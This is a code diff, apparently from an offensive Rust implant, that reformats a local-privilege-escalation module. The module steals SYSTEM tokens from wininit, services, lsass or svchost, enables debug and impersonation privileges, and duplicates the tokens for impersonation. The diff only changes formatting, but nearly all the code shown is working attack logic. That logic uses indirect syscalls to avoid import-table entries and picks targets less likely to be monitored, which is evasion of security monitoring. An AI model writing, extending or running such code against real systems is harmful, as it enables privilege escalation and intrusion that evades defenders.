@@ -12,10 +12,12 @@
 //! All NT API calls go through the existing indirect syscall layer — no IAT
 //! entries are created.
 
-use anyhow::{anyhow, Context, Result};
-use windows_sys::Win32::Security::{SecurityImpersonation, TOKEN_ALL_ACCESS, TOKEN_DUPLICATE, TOKEN_QUERY};
 use crate::win_types::HANDLE;
+use anyhow::{anyhow, Context, Result};
 use windows_sys::Win32::Security::TokenImpersonation;
+use windows_sys::Win32::Security::{
+    SecurityImpersonation, TOKEN_ALL_ACCESS, TOKEN_DUPLICATE, TOKEN_QUERY,
+};
 // ── NTSTATUS helpers ───────────────────────────────────────────────────────
 
 fn nt_success(status: i32) -> bool {
@@ -88,12 +90,7 @@ const SYSTEM_PROCESS_INFORMATION: u32 = 5;
 
 /// Ordered list of candidate processes for SYSTEM token theft.
 /// Earlier entries are preferred (more stable, less likely to be monitored).
-const SYSTEM_TARGETS: &[&str] = &[
-    "wininit.exe",
-    "services.exe",
-    "lsass.exe",
-    "svchost.exe",
-];
+const SYSTEM_TARGETS: &[&str] = &["wininit.exe", "services.exe", "lsass.exe", "svchost.exe"];
 
 // ── Indirect syscall wrappers ──────────────────────────────────────────────
 
@@ -137,7 +134,9 @@ unsafe fn nt_open_process(pid: u32) -> Result<HANDLE> {
     );
 
     if nt_error(status) {
-        Err(anyhow!("NtOpenProcess(PID {pid}) failed: NTSTATUS 0x{status:08X}"))
+        Err(anyhow!(
+            "NtOpenProcess(PID {pid}) failed: NTSTATUS 0x{status:08X}"
+        ))
     } else {
         Ok(handle)
     }
@@ -155,7 +154,9 @@ unsafe fn nt_open_process_token(process: HANDLE, access: u32) -> Result<HANDLE> 
     );
 
     if nt_error(status) {
-        Err(anyhow!("NtOpenProcessToken failed: NTSTATUS 0x{status:08X}"))
+        Err(anyhow!(
+            "NtOpenProcessToken failed: NTSTATUS 0x{status:08X}"
+        ))
     } else {
         Ok(token)
     }
@@ -232,7 +233,9 @@ unsafe fn nt_adjust_privileges_token(
     let target = match crate::syscalls::get_syscall_id("NtAdjustPrivilegesToken") {
         Ok(t) => t,
         Err(e) => {
-            tracing::error!("lpe/token_impersonate: failed to resolve NtAdjustPrivilegesToken SSN: {e}");
+            tracing::error!(
+                "lpe/token_impersonate: failed to resolve NtAdjustPrivilegesToken SSN: {e}"
+            );
             return -1;
         }
     };
@@ -255,7 +258,9 @@ unsafe fn nt_set_thread_token(thread: HANDLE, token: HANDLE) -> i32 {
     let target = match crate::syscalls::get_syscall_id("NtSetInformationThread") {
         Ok(t) => t,
         Err(e) => {
-            tracing::error!("lpe/token_impersonate: failed to resolve NtSetInformationThread SSN: {e}");
+            tracing::error!(
+                "lpe/token_impersonate: failed to resolve NtSetInformationThread SSN: {e}"
+            );
             return -1;
         }
     };
@@ -289,15 +294,17 @@ pub fn check_and_enable_privileges() -> Result<Vec<String>> {
 
     // Open our own process token.
     let current_process: HANDLE = (-1isize) as HANDLE;
-    let token = unsafe {
-        nt_open_process_token(current_process, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY)
-    }
-    .context("failed to open own process token for privilege adjustment")?;
+    let token =
+        unsafe { nt_open_process_token(current_process, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY) }
+            .context("failed to open own process token for privilege adjustment")?;
 
     let privileges_to_try: &[(&str, u64)] = &[
         ("SeDebugPrivilege", SE_DEBUG_PRIVILEGE_LUID),
         ("SeImpersonatePrivilege", SE_IMPERSONATE_PRIVILEGE_LUID),
-        ("SeAssignPrimaryTokenPrivilege", SE_ASSIGN_PRIMARY_TOKEN_LUID),
+        (
+            "SeAssignPrimaryTokenPrivilege",
+            SE_ASSIGN_PRIMARY_TOKEN_LUID,
+        ),
     ];
 
     for (name, luid) in privileges_to_try {
@@ -426,7 +433,11 @@ pub fn exploit_token_impersonation() -> Result<HANDLE> {
         let entry = unsafe { &*(buffer.as_ptr().add(offset) as *const SystemProcessInformation) };
         let pid = entry.unique_process_id as u32;
 
-        if pid != 0 && pid != my_pid && entry.image_name_length > 0 && !entry.image_name_buffer.is_null() {
+        if pid != 0
+            && pid != my_pid
+            && entry.image_name_length > 0
+            && !entry.image_name_buffer.is_null()
+        {
             let name_len = entry.image_name_length as usize;
             // The name is embedded after the fixed header in the buffer.
             let name_start = offset + std::mem::size_of::<SystemProcessInformation>();
@@ -475,7 +486,9 @@ pub fn exploit_token_impersonation() -> Result<HANDLE> {
         offset += next;
     }
 
-    Err(anyhow!("lpe/token_impersonate: no SYSTEM token could be stolen from any target process"))
+    Err(anyhow!(
+        "lpe/token_impersonate: no SYSTEM token could be stolen from any target process"
+    ))
 }
 
 /// Steal a token from a specific PID and return a duplicated impersonation token.
@@ -488,8 +501,9 @@ fn steal_system_token(pid: u32) -> Result<HANDLE> {
     let token = unsafe { nt_open_process_token(process, TOKEN_DUPLICATE | TOKEN_QUERY) }
         .with_context(|| format!("failed to open token for PID {pid}"))?;
 
-    let dup_token = unsafe { nt_duplicate_token(token, TOKEN_ALL_ACCESS, TokenImpersonation as u32) }
-        .context("failed to duplicate token")?;
+    let dup_token =
+        unsafe { nt_duplicate_token(token, TOKEN_ALL_ACCESS, TokenImpersonation as u32) }
+            .context("failed to duplicate token")?;
 
     // Clean up intermediate handles.
     nt_close_handle(token as u64);
